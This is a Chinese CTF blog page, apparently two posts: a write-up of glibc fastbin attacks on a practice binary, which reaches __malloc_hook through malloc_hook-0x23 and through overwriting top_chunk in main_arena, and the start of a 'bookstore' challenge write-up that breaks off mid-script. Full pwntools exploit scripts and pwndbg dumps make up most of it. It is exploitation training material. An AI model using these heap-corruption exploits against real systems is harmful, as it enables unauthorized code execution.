<h2 id="fd-到-malloc-hook-0x23"><a href="#fd-到-malloc-hook-0x23" class="headerlink" title="fd 到 malloc_hook-0x23"></a>fd 到 malloc_hook-0x23</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to show\n&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">while(i&lt;10):</span><br><span class="line">	p=process(&#x27;./supwn5&#x27;,aslr=2)</span><br><span class="line">	new(0x80)</span><br><span class="line">	new(1)</span><br><span class="line">	free(0)</span><br><span class="line">	new(0x80)</span><br><span class="line">	show(0)</span><br><span class="line">	p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">	leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">	base = leak-3951480</span><br><span class="line">	print hex(base)</span><br><span class="line">	i=i+1</span><br><span class="line">	p.close()</span><br></pre></td></tr></table></figure>

<p>通过上述的小脚本跑一下该程序,会发现 so 的基地址在最高字节均为<code>0x7f</code>,这也就是修改 <code>malloc_hook</code> 为 fd 的基础</p>
<p>提前说明,本篇脚本均完成到了 malloc 到了 malloc_hook ,填入 one_gadget 过程实在有点玄学,各种环境难免保证一样,各位可以自己向下研究利用.上 exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./supwn5&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to show\n&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0x80)</span><br><span class="line">new(1)</span><br><span class="line">free(0)</span><br><span class="line">new(0x80)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">base = leak-3951480</span><br><span class="line">print hex(base)</span><br><span class="line">new(0x60)</span><br><span class="line">free(2)</span><br><span class="line">edit(1,p64(0)*3+p64(0x71)+p64(base+3951341))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">new(0x60)</span><br><span class="line">new(0x60)</span><br><span class="line">edit(3,&#x27;a&#x27;*0x13+&#x27;b&#x27;*8)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>基本被玩坏了,靠的就是刚才说的在 malloc_hook-0x23 的 0x7f 固定,必然满足 fastbin 检查,直接就 malloc 出来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x19770b0 —▸ 0x7f8c9946daed (_IO_wide_data_0+301) ◂— 0x8c9912ee20000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/32gx 0x7f8c9946daed</span><br><span class="line">0x7f8c9946daed &lt;_IO_wide_data_0+301&gt;:	0x8c9946c260000000	0x000000000000007f</span><br><span class="line">0x7f8c9946dafd:	0x8c9912ee20000000	0x8c9912ea0000007f</span><br><span class="line">0x7f8c9946db0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f8c9946db1d:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>但是其实还有很多时候无法使用该方法,比如说题目在 malloc 堆的时候是固定字节或者限制 malloc 字节大小,最大是 0x60 这种,就不能这么玩了</p>
<h2 id="通过-main-arena-修改-top-chunk"><a href="#通过-main-arena-修改-top-chunk" class="headerlink" title="通过 main_arena 修改 top_chunk"></a>通过 main_arena 修改 top_chunk</h2><p>这个并不是直接在 top_chunk 修改值(类似 <code>house of force</code>),而是通过 main_arena 这个放各种结构的地方来修改,详细记录一下思路</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./supwn5&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to show\n&#x27;,str(ind))</span><br></pre></td></tr></table></figure>

<p>上述为框架函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">new(0x80)</span><br><span class="line">new(1)</span><br><span class="line">free(0)</span><br><span class="line">new(0x80)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">print hex(leak)</span><br><span class="line">base = leak-3951480</span><br><span class="line"></span><br><span class="line">//效果如下(下方的格式都是先是代码和执行完的调试结果)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0xde8000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 145, </span><br><span class="line">  fd = 0x7f06f2f30b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7f06f2f30b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xde8090 FASTBIN &#123;</span><br><span class="line">  prev_size = 144, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x20f51</span><br><span class="line">&#125;</span><br><span class="line">0xde80b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 134993, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x/32gx 0xde8000</span><br><span class="line">0xde8000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0xde8010:	0x00007f06f2f30b78	0x00007f06f2f30b78</span><br><span class="line">0xde8020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8030:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述为泄漏 libc 地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">new(0x40)</span><br><span class="line">free(2)</span><br><span class="line">edit(1,p64(0)*3+p64(0x51)+p64(0x61))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/32gx 0xde8000</span><br><span class="line">0xde8000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0xde8010:	0x00007f06f2f30b78	0x00007f06f2f30b78</span><br><span class="line">0xde8020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8090:	0x0000000000000090	0x0000000000000021</span><br><span class="line">0xde80a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde80b0:	0x0000000000000000	0x0000000000000051</span><br><span class="line">0xde80c0:	0x0000000000000061	0x0000000000000000</span><br><span class="line">0xde80d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde80e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde80f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0xde80b0 ◂— 0x61 /* &#x27;a&#x27; */</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>上述为为了之后的 malloc 出来 fastbin 做铺垫,等会作用很大</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">new(0x40)</span><br><span class="line">new(0x50)</span><br><span class="line">free(3)</span><br><span class="line">edit(2,p64(0)*9+p64(0x61)+p64(leak-0x40))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x61</span><br><span class="line">0x60: 0xde8100 —▸ 0x7f06f2f30b38 (main_arena+24) ◂— 0xde8100</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/32gx 0x7f06f2f30b38</span><br><span class="line">0x7f06f2f30b38 &lt;main_arena+24&gt;:	0x0000000000000000	0x0000000000000061</span><br><span class="line">0x7f06f2f30b48 &lt;main_arena+40&gt;:	0x0000000000de8100	0x0000000000000000</span><br><span class="line">0x7f06f2f30b58 &lt;main_arena+56&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b68 &lt;main_arena+72&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b78 &lt;main_arena+88&gt;:	0x0000000000de8160	0x0000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>可以看到上边的结果, 0x61 已经写进去了,而且 0x60 的块也构造好了,满足构造条件,下边就是合理使用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">new(0x50)</span><br><span class="line">new(0x50)</span><br><span class="line">edit(4,p64(0)*6+p64(leak-0x78))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx 0x7f06f2f30b00</span><br><span class="line">0x7f06f2f30b00 &lt;__memalign_hook&gt;:	0x00007f06f2bf1e20	0x00007f06f2bf1a00</span><br><span class="line">0x7f06f2f30b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b40 &lt;main_arena+32&gt;:	0x0000000000000061	0x0000000000000000</span><br><span class="line">0x7f06f2f30b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00007f06f2f30b00	------&gt;topchunk</span><br><span class="line">0x7f06f2f30b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x00007f06f2f30b78</span><br><span class="line">0x7f06f2f30b90 &lt;main_arena+112&gt;:	0x00007f06f2f30b78	0x00007f06f2f30b88</span><br><span class="line">pwndbg&gt; arena</span><br><span class="line">&#123;</span><br><span class="line">  mutex = 0, </span><br><span class="line">  flags = 0, </span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  top = 0x7f06f2f30b00 &lt;__memalign_hook&gt;, </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过上述,可以看到已经把 top_chunk 给改了,这里要注意一下 topchunk千万别是 0 ,注意一下偏移就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">new(1)</span><br><span class="line">edit(5,&#x27;a&#x27;*8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx 0x7f06f2f30b00-0x10</span><br><span class="line">0x7f06f2f30af0 &lt;_IO_wide_data_0+304&gt;:	0x00007f06f2f2f260	0x0000000000000000</span><br><span class="line">0x7f06f2f30b00 &lt;__memalign_hook&gt;:	0x00007f06f2bf1e20	0x0000000000000021</span><br><span class="line">0x7f06f2f30b10 &lt;__malloc_hook&gt;:	0x6161616161616161	0x0000000000000000</span><br><span class="line">0x7f06f2f30b20 &lt;main_arena&gt;:	0x0000000000000000	0x00007f06f2bf19e1</span><br><span class="line">0x7f06f2f30b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b40 &lt;main_arena+32&gt;:	0x0000000000000061	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>利用成功,完整 exp 见下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./supwn5&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to show\n&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">new(0x80)</span><br><span class="line">new(1)</span><br><span class="line">free(0)</span><br><span class="line">new(0x80)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">print hex(leak)</span><br><span class="line">base = leak-3951480</span><br><span class="line">new(0x40)</span><br><span class="line">free(2)</span><br><span class="line">edit(1,p64(0)*3+p64(0x51)+p64(0x61))</span><br><span class="line">new(0x40)</span><br><span class="line">new(0x50)</span><br><span class="line">free(3)</span><br><span class="line">edit(2,p64(0)*9+p64(0x61)+p64(leak-0x40))</span><br><span class="line">new(0x50)</span><br><span class="line">new(0x50)</span><br><span class="line">edit(4,p64(0)*6+p64(leak-0x78))</span><br><span class="line">new(1)</span><br><span class="line">edit(5,&#x27;a&#x27;*8)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这个可以看到 fastbin–&gt;malloc_hook 还是比较简单的,但是构造起来很需要耐心.同时其实我这个 unlink 偷懒了,完全可以很稳的执行 system(‘&#x2F;bin&#x2F;sh’) 的,但我还是比较懒,直接向 free_hook 填的 one_gadget ,不过还好成功了.所以其实还是得少用 one_gadget ,这个还是下策</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/11/2019-11-11-strange_1/" data-id="cuidSomOXLWdzQwuUi6utVYLB" data-title="Some strange questions" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-11-04-5th_week" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/04/2019-11-04-5th_week/" class="article-date">
  <time class="dt-published" datetime="2019-11-03T16:00:00.000Z" itemprop="datePublished">2019-11-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/04/2019-11-04-5th_week/">fifth week</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>本周脱离 wp 生存的第一周,困难重重</p>
<h2 id="铁三的-bookstore"><a href="#铁三的-bookstore" class="headerlink" title="铁三的 bookstore"></a>铁三的 bookstore</h2><p>这题是自写函数的溢出,看似很简单,其实利用起来很难,我的思路是一个堆块复用实现各种泄漏,但是泄漏出来发现用不了,这个有一个很恶心的就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( (unsigned int)size &gt; 0x50 )</span><br><span class="line">  return puts(&quot;Too big!&quot;);</span><br></pre></td></tr></table></figure>

<p>size 的限制,让我头皮发麻,我尝试了几种方案都没有好的办法,最后只能 unlink 了,没办法,我一会试着写下 wp ,现在写一下目前的心路历程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bookstore&#x27;)</span><br><span class="line">elf = ELF(&quot;./bookstore&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">context.log_level = 